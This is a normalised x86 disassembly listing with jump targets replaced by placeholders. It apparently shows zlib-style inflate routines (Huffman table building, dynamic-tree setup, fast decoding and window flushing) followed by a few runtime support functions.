mov [ esp + 0x1c ] eax
jne r-xdata
mov ecx [ esp + 0x1c ]
mov [ esp + 0x18 ] eax
mov ecx [ esi + 0x2c ]
sub ecx edx
mov ecx eax
sub ecx edx
dec ecx
jmp r-xdata
mov edx ecx
cmp edx eax
jae r-xdata
mov ecx [ esp + 0x10 ]
dec eax
neg eax
sbb eax eax
and eax 0x2
add eax 0x7
mov [ ecx ] eax
mov eax ecx
jmp r-xdata
test eax eax
mov [ esp + 0x14 ] ecx
je r-xdata
mov eax [ esp + 0x10 ]
test cl 0x20
je r-xdata
mov eax [ esp + 0x10 ]
mov [ eax + 0xc ] ecx
mov eax [ esp + 0x18 ]
mov ecx [ eax + 0x4 ]
lea ecx [ eax + ecx * 8 ]
mov eax [ esp + 0x10 ]
mov [ eax + 0x8 ] ecx
jmp r-xdata
mov ecx [ eax + 0x4 ]
dec ecx
mov [ eax + 0x4 ] ecx
jne r-xdata
mov ecx [ esi + 0x28 ]
mov [ esp + 0x18 ] ecx
mov [ esi + 0x34 ] edx
mov edx [ esp + 0x2c ]
push edx
push edi
push esi
call sub_40a0a0
mov edx [ esi + 0x34 ]
mov [ esp + 0x38 ] eax
mov eax [ esi + 0x30 ]
add esp 0xc
cmp edx eax
jae r-xdata
mov eax [ esi + 0x30 ]
mov ecx [ esi + 0x28 ]
cmp eax ecx
je r-xdata
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x28 ]
cmp eax ecx
je r-xdata
mov [ esp + 0x14 ] ecx
mov ecx [ esi + 0x2c ]
cmp edx ecx
mov [ esp + 0x1c ] ecx
jne r-xdata
mov eax [ esp + 0x1c ]
sub eax edx
sub eax edx
dec eax
jmp r-xdata
mov [ eax ] 0x9
mov [ edi + 0x18 ] rw-data
jmp r-xdata
mov [ eax ] 0x7
jmp r-xdata
mov ecx [ esi + 0x2c ]
sub ecx edx
mov ecx eax
sub ecx edx
dec ecx
jmp r-xdata
mov edx ecx
cmp edx eax
jae r-xdata
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x28 ]
mov [ esi + 0x20 ] eax
mov [ esi + 0x1c ] ebx
mov ebx [ edi ]
mov eax ebp
mov [ edi + 0x4 ] ecx
mov ecx [ edi + 0x8 ]
sub eax ebx
mov [ edi ] ebp
add ecx eax
mov [ edi + 0x8 ] ecx
mov ecx [ esp + 0x2c ]
push ecx
push edi
push esi
mov [ esi + 0x34 ] edx
call sub_40a0a0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x10 ]
mov edx ecx
cmp edx eax
jae r-xdata
test eax eax
mov [ esp + 0x14 ] eax
jne r-xdata
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x28 ]
mov [ esi + 0x20 ] ecx
mov [ esi + 0x1c ] ebx
mov ebx [ edi ]
mov ecx ebp
mov [ edi + 0x4 ] eax
mov eax [ edi + 0x8 ]
sub ecx ebx
push 0xfffffffd
add eax ecx
push edi
mov [ edi + 0x8 ] eax
mov [ edi ] ebp
push esi
mov [ esi + 0x34 ] edx
call sub_40a0a0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x28 ]
cmp eax ecx
je r-xdata
mov [ esp + 0x14 ] ecx
mov ecx [ esi + 0x2c ]
cmp edx ecx
mov [ esp + 0x1c ] ecx
jne r-xdata
mov eax [ esp + 0x1c ]
sub eax edx
sub eax edx
dec eax
jmp r-xdata
mov eax [ esp + 0x1c ]
sub eax edx
sub eax edx
dec eax
jmp r-xdata
mov eax [ esp + 0x10 ]
mov edx ecx
cmp edx eax
jae r-xdata
test eax eax
mov [ esp + 0x14 ] eax
jne r-xdata
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x1c ]
sub eax edx
sub eax edx
dec eax
jmp r-xdata
mov [ esp + 0x14 ] eax
sub_409970
push ecx
push ebx
push edi
mov edi [ esp + 0x20 ]
push 0x4
push 0x13
mov [ esp + 0x10 ] 0x0
mov eax [ edi + 0x28 ]
push eax
call [ edi + 0x20 ]
mov ebx eax
add esp 0xc
test ebx ebx
jne r-xdata
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x18 ]
push ebp
mov ebp [ esp + 0x18 ]
push esi
lea ecx [ esp + 0x10 ]
push ebx
push ecx
mov ecx [ esp + 0x20 ]
push edx
push ebp
push eax
push 0x0
push 0x0
push 0x13
push 0x13
push ecx
call sub_409a20
mov esi eax
add esp 0x28
cmp esi 0xfffffffd
jne r-xdata
pop edi
mov eax 0xfffffffc
pop ebx
pop ecx
retn
cmp esi 0xfffffffb
je r-xdata
mov edx [ edi + 0x28 ]
push ebx
push edx
mov [ edi + 0x18 ] rw-data
call [ edi + 0x24 ]
add esp 0x8
mov eax esi
pop esi
pop ebp
pop edi
pop ebx
pop ecx
retn
mov [ edi + 0x18 ] rw-data
mov esi 0xfffffffd
cmp [ ebp ] 0x0
jne r-xdata
mov edx [ edi + 0x28 ]
push ebx
push edx
call [ edi + 0x24 ]
add esp 0x8
mov eax esi
pop esi
pop ebp
pop edi
pop ebx
pop ecx
retn
sub_409a20
sub esp 0x100
mov ecx [ esp + 0x104 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x114 ]
push edi
xor edi edi
mov edx esi
mov [ esp + 0x54 ] edi
mov [ esp + 0x58 ] edi
mov [ esp + 0x5c ] edi
mov [ esp + 0x60 ] edi
mov [ esp + 0x64 ] edi
mov [ esp + 0x68 ] edi
mov [ esp + 0x6c ] edi
mov [ esp + 0x70 ] edi
mov [ esp + 0x74 ] edi
mov [ esp + 0x78 ] edi
mov [ esp + 0x7c ] edi
mov [ esp + 0x80 ] edi
mov [ esp + 0x84 ] edi
mov [ esp + 0x88 ] edi
mov [ esp + 0x8c ] edi
mov [ esp + 0x90 ] edi
mov eax [ ecx ]
add ecx 0x4
mov ebp [ esp + eax * 4 + 0x54 ]
lea eax [ esp + eax * 4 + 0x54 ]
inc ebp
dec edx
mov [ eax ] ebp
jne r-xdata
cmp [ esp + 0x54 ] esi
jne r-xdata
mov ebx [ esp + 0x12c ]
mov ecx 0x1
lea eax [ esp + 0x58 ]
mov ebp [ ebx ]
mov [ esp + 0x10 ] ebp
mov ecx [ esp + 0x128 ]
mov edx [ esp + 0x12c ]
mov [ ecx ] edi
mov [ edx ] edi
mov eax ecx
cmp ebp ecx
mov [ esp + 0x14 ] eax
jae r-xdata
inc ecx
add eax 0x4
cmp ecx 0xf
jbe r-xdata
mov edx 0xf
lea esi [ esp + 0x90 ]
mov [ esp + 0x10 ] ecx
mov ebp ecx
cmp [ eax ] edi
jne r-xdata
cmp ebp edx
mov [ esp + 0x2c ] edx
jbe r-xdata
dec edx
sub esi 0x4
cmp edx edi
jne r-xdata
mov esi 0x1
mov [ ebx ] ebp
shl esi cl
cmp ecx edx
jae r-xdata
mov [ esp + 0x10 ] edx
mov ebp edx
cmp [ esi ] edi
jne r-xdata
lea ecx [ edx * 4 ]
mov [ esp + 0x20 ] ecx
mov ebx [ esp + ecx + 0x54 ]
lea ecx [ esp + ecx + 0x54 ]
sub esi ebx
mov [ esp + 0x44 ] esi
jns r-xdata
lea ebx [ esp + ecx * 4 + 0x54 ]
add ebx esi
mov [ esp + 0x98 ] edi
mov [ ecx ] ebx
xor ecx ecx
dec edx
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0xfffffffd
pop ebx
add esp 0x100
retn
inc ecx
add ebx 0x4
shl esi 0x1
cmp ecx edx
jb r-xdata
mov edx [ esp + 0x114 ]
xor ebx ebx
xor ebx ebx
sub esi [ ebx ]
js r-xdata
mov ecx [ esp + 0x118 ]
inc ebx
cmp ebx ecx
jb r-xdata
mov edx [ esp + ecx * 4 + 0x94 ]
mov esi [ esp + 0x138 ]
lea ecx [ esp + ecx * 4 + 0x94 ]
mov [ esi + edx * 4 ] ebx
mov esi [ esp + 0x44 ]
inc edx
mov [ ecx ] edx
mov edx [ esp + 0x1c ]
add ecx [ esp + ebx + 0x58 ]
add ebx 0x4
dec edx
mov [ esp + ebx + 0x98 ] ecx
jne r-xdata
mov ecx [ edx ]
add edx 0x4
cmp ecx edi
mov [ esp + 0x1c ] edx
je r-xdata
mov ecx [ esp + 0x20 ]
mov ebx ebp
neg ebx
mov edx [ esp + ecx + 0x94 ]
mov ecx [ esp + 0x138 ]
mov [ esp + 0x1c ] ecx
mov ecx [ esp + 0x2c ]
cmp eax ecx
mov [ esp + 0x118 ] edx
mov [ esp + 0x38 ] edi
mov [ esp + 0x94 ] edi
mov [ esp + 0x18 ] 0xffffffff
mov [ esp + 0xd4 ] edi
mov [ esp + 0x40 ] edi
mov [ esp + 0x3c ] edi
jg r-xdata
cmp esi edi
je r-xdata
mov esi [ esp + 0x34 ]
lea edx [ eax - 0x1 ]
lea ecx [ esp + eax * 4 + 0x54 ]
mov [ esp + 0x20 ] edx
mov [ esp + 0x28 ] ecx
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x100
retn
cmp [ esp + 0x2c ] 0x1
je r-xdata
mov ecx [ esp + 0x28 ]
mov edx [ esp + 0x20 ]
add ecx 0x4
inc eax
mov [ esp + 0x28 ] ecx
mov ecx [ esp + 0x2c ]
inc edx
cmp eax ecx
mov [ esp + 0x14 ] eax
mov [ esp + 0x20 ] edx
jle r-xdata
jmp r-xdata
pop edi
pop esi
pop ebp
mov eax 0xfffffffb
pop ebx
add esp 0x100
retn
mov edx [ esp + 0x28 ]
mov edx [ edx ]
mov ecx edx
dec edx
test ecx ecx
mov [ esp + 0x24 ] edx
je r-xdata
mov esi [ esp + 0x44 ]
xor edi edi
lea ecx [ ebx + ebp ]
cmp eax ecx
jle r-xdata
mov ecx [ esp + 0x138 ]
mov dl al
mov ebp [ esp + 0x1c ]
sub dl bl
mov [ esp + 0x31 ] dl
mov edx [ esp + 0x118 ]
lea ecx [ ecx + edx * 4 ]
cmp ebp ecx
jb r-xdata
inc edx
mov [ esp + 0x50 ] edx
jmp r-xdata
mov esi [ ebp ]
mov ecx [ esp + 0x11c ]
cmp esi ecx
jae r-xdata
mov [ esp + 0x30 ] 0xc0
jmp r-xdata
mov edx [ esp + 0x18 ]
add ebx ebp
inc edx
add ecx ebp
mov [ esp + 0x18 ] edx
mov edx [ esp + 0x2c ]
sub edx ebx
mov [ esp + 0x48 ] ecx
cmp edx ebp
jbe r-xdata
sub esi ecx
mov ecx [ esp + 0x124 ]
shl esi 0x2
mov dl [ esi + ecx ]
mov ecx [ esp + 0x120 ]
add dl 0x50
mov esi [ esi + ecx ]
mov [ esp + 0x30 ] dl
cmp esi 0x100
sbb dl dl
and dl 0xa0
add dl 0x60
mov [ esp + 0x30 ] dl
jmp r-xdata
mov ecx eax
mov edx 0x1
sub ecx ebx
mov eax edi
shl edx cl
mov ecx ebx
shr eax cl
cmp eax [ esp + 0x3c ]
jae r-xdata
mov edi [ esp + 0x50 ]
mov ecx eax
sub ecx ebx
mov eax 0x1
shl eax cl
cmp eax edi
jbe r-xdata
mov edx ebp
mov ecx [ esp + 0x20 ]
mov eax 0x1
shl eax cl
test edi eax
je r-xdata
mov ecx [ esp + 0x40 ]
lea ecx [ ecx + eax * 8 ]
add ebp 0x4
mov [ esp + 0x1c ] ebp
mov ebp [ esp + 0x134 ]
mov edx 0x1
shl edx cl
mov eax [ ebp ]
mov [ esp + 0x3c ] edx
add edx eax
cmp edx 0x5a0
ja r-xdata
mov ebp [ esp + 0x24 ]
or edi 0xffffffff
sub edi ebp
mov ebp [ esp + 0x28 ]
add eax edi
cmp ecx edx
jae r-xdata
mov edx [ esp + 0x18 ]
mov ebp 0x1
mov ecx ebx
xor edi eax
shl ebp cl
mov ecx [ esp + edx * 4 + 0x94 ]
lea eax [ esp + edx * 4 + 0x94 ]
mov [ esp + 0x38 ] edi
dec ebp
and ebp edi
cmp ebp ecx
je r-xdata
xor edi eax
shr eax 0x1
test edi eax
jne r-xdata
mov ebp [ esp + 0x30 ]
add eax edx
mov [ ecx ] ebp
lea ebp [ edx * 8 ]
mov [ ecx + 0x4 ] esi
add ecx ebp
cmp eax [ esp + 0x3c ]
jb r-xdata
mov edi [ esp + 0x130 ]
mov [ ebp ] edx
mov edx [ esp + 0x18 ]
lea eax [ edi + eax * 8 ]
mov edi [ esp + 0x18 ]
test edx edx
lea edi [ esp + edi * 4 + 0xd4 ]
mov [ esp + 0x40 ] eax
mov [ esp + 0x4c ] edi
mov [ edi ] eax
je r-xdata
inc ecx
cmp ecx edx
jae r-xdata
mov eax [ esp + 0x24 ]
mov ebp [ esp + 0x10 ]
mov edx eax
dec eax
mov [ esp + 0x24 ] eax
mov eax [ esp + 0x14 ]
test edx edx
jne r-xdata
mov ebp [ esp + 0x10 ]
dec edx
sub ebx ebp
mov ebp 0x1
mov ecx ebx
sub eax 0x4
shl ebp cl
mov ecx [ eax ]
dec ebp
and ebp edi
cmp ebp ecx
jne r-xdata
mov ecx [ esp + 0x128 ]
mov edi [ esp + 0x38 ]
mov [ ecx ] eax
mov edi [ esp + 0x38 ]
mov eax [ esp + 0x10 ]
mov esi [ esp + 0x40 ]
mov [ esp + 0x30 ] cl
mov ecx ebx
mov [ esp + edx * 4 + 0x94 ] edi
mov edx [ esp + 0x4c ]
mov [ esp + 0x31 ] al
sub ecx eax
mov eax edi
shr eax cl
mov ecx [ edx - 0x4 ]
mov edx [ esp + 0x30 ]
sub esi ecx
sar esi 0x3
sub esi eax
mov [ ecx + eax * 8 ] edx
mov [ ecx + eax * 8 + 0x4 ] esi
jmp r-xdata
mov edi [ ebp + 0x4 ]
add ebp 0x4
shl eax 0x1
cmp eax edi
jbe r-xdata
mov edx [ esp + 0x24 ]
mov [ esp + 0x18 ] edx
mov ebp [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x48 ]
mov eax [ esp + 0x14 ]
cmp eax ecx
jg r-xdata
sub eax edi
inc ecx
cmp ecx edx
jb r-xdata
sub_409ee0
push ecx
push ebx
mov ebx [ esp + 0x2c ]
push ebp
push esi
mov eax [ ebx + 0x28 ]
push edi
push 0x4
push 0x120
push eax
mov [ esp + 0x1c ] 0x0
call [ ebx + 0x20 ]
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
mov edx [ esp + 0x34 ]
mov eax [ esp + 0x24 ]
mov ebp [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
push edi
push ecx
mov ecx [ esp + 0x34 ]
push edx
mov edx [ esp + 0x2c ]
push eax
push ecx
push r--data
push r--data
push 0x101
push ebp
push edx
call sub_409a20
mov esi eax
add esp 0x28
test esi esi
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0xfffffffc
pop ebx
pop ecx
retn
cmp esi 0xfffffffd
jne r-xdata
mov eax [ esp + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
cmp esi 0xfffffffc
je r-xdata
mov edx [ ebx + 0x28 ]
push edi
push edx
mov [ ebx + 0x18 ] rw-data
call [ ebx + 0x24 ]
add esp 0x8
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov [ ebx + 0x18 ] rw-data
mov esi 0xfffffffd
mov edx [ esp + 0x34 ]
mov eax [ esp + 0x28 ]
lea ecx [ esp + 0x10 ]
push edi
push ecx
mov ecx [ esp + 0x38 ]
push edx
mov edx [ esp + 0x28 ]
push eax
mov eax [ esp + 0x30 ]
push ecx
push r--data
push r--data
push esi
lea ecx [ eax + ebp * 4 ]
push edx
push ecx
call sub_409a20
mov esi eax
add esp 0x28
test esi esi
jne r-xdata
mov edx [ ebx + 0x28 ]
push edi
push edx
call [ ebx + 0x24 ]
add esp 0x8
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
cmp esi 0xfffffffd
jne r-xdata
mov edx [ esp + 0x28 ]
cmp [ edx ] 0x0
jne r-xdata
cmp esi 0xfffffffb
jne r-xdata
mov ecx [ ebx + 0x28 ]
push edi
push ecx
mov [ ebx + 0x18 ] rw-data
call [ ebx + 0x24 ]
add esp 0x8
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax [ ebx + 0x28 ]
push edi
push eax
call [ ebx + 0x24 ]
add esp 0x8
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
cmp ebp 0x101
ja r-xdata
cmp esi 0xfffffffc
je r-xdata
mov ecx [ ebx + 0x28 ]
push edi
push ecx
mov [ ebx + 0x18 ] rw-data
mov esi 0xfffffffd
call [ ebx + 0x24 ]
add esp 0x8
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov [ ebx + 0x18 ] rw-data
mov esi 0xfffffffd
mov ecx [ ebx + 0x28 ]
push edi
push ecx
call [ ebx + 0x24 ]
add esp 0x8
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
sub_40a0a0
push ecx
push ebx
mov ebx [ esp + 0xc ]
push ebp
push esi
mov esi [ esp + 0x18 ]
mov ebp [ ebx + 0x34 ]
push edi
mov edi [ ebx + 0x30 ]
mov eax [ esi + 0xc ]
cmp edi ebp
mov [ esp + 0x10 ] eax
mov [ esp + 0x18 ] edi
jbe r-xdata
mov eax [ esi + 0x10 ]
sub ebp edi
cmp ebp eax
jbe r-xdata
mov ebp [ ebx + 0x2c ]
test ebp ebp
je r-xdata
mov ebp eax
mov edx [ esi + 0x14 ]
sub eax ebp
add edx ebp
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] edx
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
cmp [ esp + 0x20 ] 0xfffffffb
jne r-xdata
mov ecx ebp
mov esi edi
mov edi [ esp + 0x10 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ esp + 0x18 ]
mov ecx edx
and ecx 0x3
add eax ebp
[ edi ] [ esi ]
mov edi [ esp + 0x10 ]
mov ecx [ ebx + 0x2c ]
add edi ebp
cmp eax ecx
mov [ esp + 0x10 ] edi
jne r-xdata
mov ecx [ ebx + 0x3c ]
push ebp
push edi
push ecx
call eax
mov [ ebx + 0x3c ] eax
add esp 0xc
mov [ esi + 0x30 ] eax
mov [ esp + 0x20 ] 0x0
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x10 ]
pop edi
pop esi
mov [ ecx + 0xc ] edx
mov [ ebx + 0x30 ] eax
mov eax [ esp + 0x18 ]
pop ebp
pop ebx
pop ecx
retn
mov eax [ ebx + 0x34 ]
mov esi [ ebx + 0x28 ]
cmp eax ecx
mov [ esp + 0x18 ] esi
jne r-xdata
mov edi [ esp + 0x1c ]
mov ebp [ ebx + 0x34 ]
sub ebp esi
mov eax [ edi + 0x10 ]
cmp ebp eax
jbe r-xdata
mov [ ebx + 0x34 ] esi
test ebp ebp
je r-xdata
mov ebp eax
mov edx [ edi + 0x14 ]
sub eax ebp
add edx ebp
mov [ edi + 0x10 ] eax
mov [ edi + 0x14 ] edx
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
cmp [ esp + 0x20 ] 0xfffffffb
jne r-xdata
mov eax [ esp + 0x10 ]
mov ecx ebp
mov edx ecx
mov edi eax
shr ecx 0x2
[ edi ] [ esi ]
add eax ebp
mov ecx edx
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x18 ]
and ecx 0x3
add eax ebp
[ edi ] [ esi ]
mov [ esp + 0x18 ] eax
mov ecx [ ebx + 0x3c ]
push ebp
push esi
push ecx
call eax
mov [ ebx + 0x3c ] eax
add esp 0xc
mov [ edi + 0x30 ] eax
mov [ esp + 0x20 ] 0x0
sub_40a1e0
sub esp 0x14
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x28 ]
push ebx
push ebp
mov ebp [ eax ]
mov eax [ eax + 0x4 ]
mov edx [ ecx + 0x20 ]
push esi
mov esi [ ecx + 0x30 ]
push edi
mov edi [ ecx + 0x34 ]
mov [ esp + 0x10 ] eax
mov eax [ ecx + 0x1c ]
cmp edi esi
mov [ esp + 0x18 ] ebp
jae r-xdata
mov ecx [ ecx + 0x2c ]
sub ecx edi
mov [ esp + 0x14 ] ecx
sub esi edi
dec esi
mov [ esp + 0x14 ] esi
jmp r-xdata
mov ecx [ esp + 0x1c ]
mov esi [ esp + 0x30 ]
and ecx edx
xor ebx ebx
mov bl [ esi + ecx * 8 ]
lea esi [ esi + ecx * 8 ]
test ebx ebx
je r-xdata
mov ecx [ esp + 0x10 ]
dec ecx
mov [ esp + 0x10 ] ecx
xor ecx ecx
mov cl [ ebp ]
mov esi ecx
mov ecx eax
shl esi cl
add eax 0x8
or edx esi
inc ebp
cmp eax 0x14
jb r-xdata
mov ecx [ esp + 0x28 ]
mov ecx [ ecx * 4 + rw-data ]
mov [ esp + 0x1c ] ecx
mov ecx [ esp + 0x2c ]
mov ecx [ ecx * 4 + rw-data ]
mov [ esp + 0x20 ] ecx
xor ecx ecx
mov cl [ esi + 0x1 ]
shr edx cl
sub eax ecx
mov cl [ esi + 0x4 ]
mov [ edi ] cl
mov ecx [ esp + 0x14 ]
inc edi
dec ecx
mov [ esp + 0x14 ] ecx
xor ecx ecx
mov cl [ esi + 0x1 ]
shr edx cl
sub eax ecx
mov [ esp + 0x28 ] ecx
test bl 0x10
jne r-xdata
mov [ esp + 0x18 ] ebp
mov esi [ esp + 0x3c ]
mov ebx [ esp + 0x10 ]
mov ecx [ esi + 0x4 ]
sub ecx ebx
mov ebx eax
shr ebx 0x3
cmp ebx ecx
jae r-xdata
cmp [ esp + 0x10 ] 0xa
jb r-xdata
and ebx 0xf
sub eax ebx
mov ecx [ ebx * 4 + rw-data ]
and ecx edx
add ecx [ esi + 0x4 ]
mov [ esp + 0x2c ] ecx
mov ecx ebx
shr edx cl
cmp eax 0xf
jae r-xdata
test bl 0x40
jne r-xdata
mov ebx [ esp + 0x38 ]
sub ebp ecx
mov [ ebx + 0x20 ] edx
lea edx [ ecx * 8 ]
sub eax edx
mov [ ebx + 0x1c ] eax
mov eax [ esp + 0x10 ]
mov edx [ esi ]
add ecx eax
mov eax [ esi + 0x8 ]
mov [ esi + 0x4 ] ecx
mov ecx ebp
mov [ esi ] ebp
sub ecx edx
add eax ecx
mov [ esi + 0x8 ] eax
mov [ ebx + 0x34 ] edi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x14
retn
mov ecx ebx
jmp r-xdata
mov ecx [ esp + 0x20 ]
mov esi [ esp + 0x34 ]
and ecx edx
xor ebx ebx
mov bl [ esi + ecx * 8 ]
lea esi [ esi + ecx * 8 ]
xor ecx ecx
mov cl [ esi + 0x1 ]
shr edx cl
sub eax ecx
mov [ esp + 0x28 ] ecx
test bl 0x10
jne r-xdata
mov ecx [ esp + 0x10 ]
dec ecx
mov [ esp + 0x10 ] ecx
xor ecx ecx
mov cl [ ebp ]
mov esi ecx
mov ecx eax
shl esi cl
add eax 0x8
or edx esi
inc ebp
cmp eax 0xf
jb r-xdata
test bl 0x20
je r-xdata
mov ecx [ ebx * 4 + rw-data ]
mov ebx [ esi + 0x4 ]
and ecx edx
add ecx ebx
xor ebx ebx
mov bl [ esi + ecx * 8 ]
lea esi [ esi + ecx * 8 ]
test ebx ebx
je r-xdata
cmp eax 0x14
jae r-xdata
and ebx 0xf
cmp eax ebx
jae r-xdata
test bl 0x40
jne r-xdata
mov [ esp + 0x18 ] ebp
mov ecx [ esp + 0x3c ]
mov ebx [ esp + 0x10 ]
mov esi [ ecx + 0x4 ]
mov [ ecx + 0x18 ] rw-data
sub esi ebx
mov [ esp + 0x2c ] esi
mov esi eax
mov ebx [ esp + 0x2c ]
shr esi 0x3
cmp esi ebx
jb r-xdata
mov esi [ esp + 0x3c ]
mov ebx [ esp + 0x10 ]
mov ecx [ esi + 0x4 ]
sub ecx ebx
mov ebx eax
shr ebx 0x3
cmp ebx ecx
jae r-xdata
xor ecx ecx
mov cl [ esi + 0x1 ]
shr edx cl
sub eax ecx
mov [ esp + 0x28 ] ecx
test bl 0x10
je r-xdata
mov ebp [ ebx * 4 + rw-data ]
mov ecx [ esi + 0x4 ]
mov esi [ esp + 0x14 ]
and ebp edx
add ebp ecx
mov ecx ebx
shr edx cl
mov ecx [ esp + 0x2c ]
sub eax ebx
sub esi ecx
mov [ esp + 0x14 ] esi
mov esi edi
sub esi ebp
mov ebp [ esp + 0x38 ]
mov ebx [ ebp + 0x28 ]
cmp esi ebx
jae r-xdata
mov ecx [ esp + 0x10 ]
dec ecx
mov [ esp + 0x10 ] ecx
xor ecx ecx
mov cl [ ebp ]
mov ebp ecx
mov ecx eax
shl ebp cl
add eax 0x8
or edx ebp
mov ebp [ esp + 0x18 ]
inc ebp
cmp eax ebx
mov [ esp + 0x18 ] ebp
jb r-xdata
mov ecx [ esp + 0x3c ]
mov ebx [ esp + 0x10 ]
mov esi [ ecx + 0x4 ]
mov [ ecx + 0x18 ] rw-data
sub esi ebx
mov [ esp + 0x2c ] esi
mov esi eax
mov ebx [ esp + 0x2c ]
shr esi 0x3
cmp esi ebx
jb r-xdata
mov ecx [ ebx * 4 + rw-data ]
mov ebx [ esi + 0x4 ]
and ecx edx
add ecx ebx
xor ebx ebx
mov bl [ esi + ecx * 8 ]
lea esi [ esi + ecx * 8 ]
xor ecx ecx
mov cl [ esi + 0x1 ]
shr edx cl
sub eax ecx
mov [ esp + 0x28 ] ecx
test bl 0x10
je r-xdata
mov ebx [ esp + 0x38 ]
sub ebp esi
mov [ ebx + 0x20 ] edx
lea edx [ esi * 8 ]
sub eax edx
mov edx ebp
mov [ ebx + 0x1c ] eax
mov eax [ esp + 0x10 ]
add esi eax
mov eax [ ecx + 0x8 ]
mov [ ecx + 0x4 ] esi
mov esi [ ecx ]
sub edx esi
mov [ ecx ] ebp
add eax edx
mov [ ecx + 0x8 ] eax
mov [ ebx + 0x34 ] edi
pop edi
pop esi
pop ebp
mov eax 0xfffffffd
pop ebx
add esp 0x14
retn
mov esi [ esp + 0x2c ]
mov ebx [ esp + 0x38 ]
sub ebp ecx
mov [ ebx + 0x20 ] edx
lea edx [ ecx * 8 ]
sub eax edx
mov [ ebx + 0x1c ] eax
mov eax [ esp + 0x10 ]
mov edx [ esi ]
add ecx eax
mov eax [ esi + 0x8 ]
mov [ esi + 0x4 ] ecx
mov ecx ebp
mov [ esi ] ebp
sub ecx edx
add eax ecx
mov [ esi + 0x8 ] eax
mov [ ebx + 0x34 ] edi
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x14
retn
mov ecx ebx
mov bl [ esi ]
mov [ edi ] bl
mov bl [ esi + 0x1 ]
inc edi
inc esi
mov [ edi ] bl
inc edi
inc esi
sub ecx 0x2
mov ebp [ ebp + 0x2c ]
mov [ esp + 0x28 ] ebp
sub ebp ebx
jmp r-xdata
mov bl [ esi ]
mov [ edi ] bl
inc edi
inc esi
dec ecx
jne r-xdata
mov ebp [ esp + 0x18 ]
jmp r-xdata
add esi ebp
cmp esi ebx
jb r-xdata
mov ebp [ esp + 0x28 ]
sub ebp esi
cmp ecx ebp
jbe r-xdata
cmp [ esp + 0x14 ] 0x102
jb r-xdata
mov bl [ esi ]
mov [ edi ] bl
mov bl [ esi + 0x1 ]
inc edi
inc esi
mov [ edi ] bl
inc edi
inc esi
sub ecx 0x2
sub ecx ebp
mov bl [ esi ]
mov [ edi ] bl
inc edi
inc esi
dec ecx
jne r-xdata
mov ebp [ esp + 0x18 ]
jmp r-xdata
mov bl [ esi ]
mov [ edi ] bl
inc edi
inc esi
dec ebp
jne r-xdata
mov esi [ esp + 0x38 ]
mov esi [ esi + 0x28 ]
mov bl [ esi ]
mov [ edi ] bl
inc edi
inc esi
dec ecx
jne r-xdata
mov ebp [ esp + 0x18 ]
jmp r-xdata
sub_40a5cc
mov edi edi
push ebp
mov ebp esp
push esi
jmp r-xdata
push [ ebp + 0x8 ]
call sub_415170
mov esi eax
pop ecx
test esi esi
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
sub_40a617
push 0xc
mov eax sub_425a30
call sub_415bf3
xor eax eax
xor edx edx
cmp ecx edx
setne al
cmp eax edx
jne r-xdata
cmp [ ecx + 0xc ] edx
jne r-xdata
call sub_40a7dd
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x4 ] edx
call [ ecx + 0xc ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
xor eax eax
jmp r-xdata
call sub_415c98
retn
sub_40a661
mov edi edi
push ebp
mov ebp esp
mov eax ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
call sub_40a7dd
cmp eax [ ebp + 0x8 ]
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
pop ebp
retn 0x4
sub_40a68c
mov edi edi
push ebp
mov ebp esp
test ecx ecx
jne r-xdata
mov eax [ ecx ]
call [ eax ]
test eax eax
je r-xdata
call sub_40a7dd
mov ecx eax
pop ebp
jmp sub_40a661
sub_40a6aa
mov edi edi
push ebp
mov ebp esp
push esi
call sub_40bc2a
push 0x0
mov esi eax
call sub_40ae76
push [ ebp + 0x8 ]
lea ecx [ esi + 0x1c ]
call sub_40aa7b
push 0x0
call sub_40aee8
pop esi
pop ebp
retn 0x4
sub_40a6ee
mov edi edi
push ebp
mov ebp esp
sub esp 0x408
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ecx ]
lea edx [ ebp - 0x408 ]
push edx
push 0x200
lea edx [ ebp - 0x404 ]
push edx
call [ eax + 0xc ]
test eax eax
je r-xdata
